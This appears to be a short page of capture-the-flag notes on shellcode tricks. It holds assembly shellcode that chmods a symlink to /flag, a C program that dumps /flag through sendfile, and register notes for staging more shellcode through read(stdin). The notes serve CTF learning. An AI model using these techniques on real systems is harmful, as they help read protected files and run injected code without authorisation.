---
layout: wrapper
title: Beyond Shells
---

## Symbolic link abuse `chmod("f", 4)`
```python
os.system("ln -s /flag f")
shellcode = asm('''
    push 0x66
    push rsp
    pop rdi
    push 0x4
    pop rsi
    push 0x5a
    pop rax
    syscall
''')
```

## Calling another binary `execve("a", NULL, NULL)`
```c
// gcc a.c -o a
#include <fcntl.h>
#include <sys/sendfile.h>
int main() {
    sendfile(1, open("/flag", O_RDONLY), 0, 0x1000);
    return 0;
}
```

## Calling `read(stdin)` to inject more shellcode
- `rax`: 0
- `rdi`: fd (0 for stdin)
- `rsi`: buf
- `rdx`: count
- `xchg` could be used to exchange useful register values
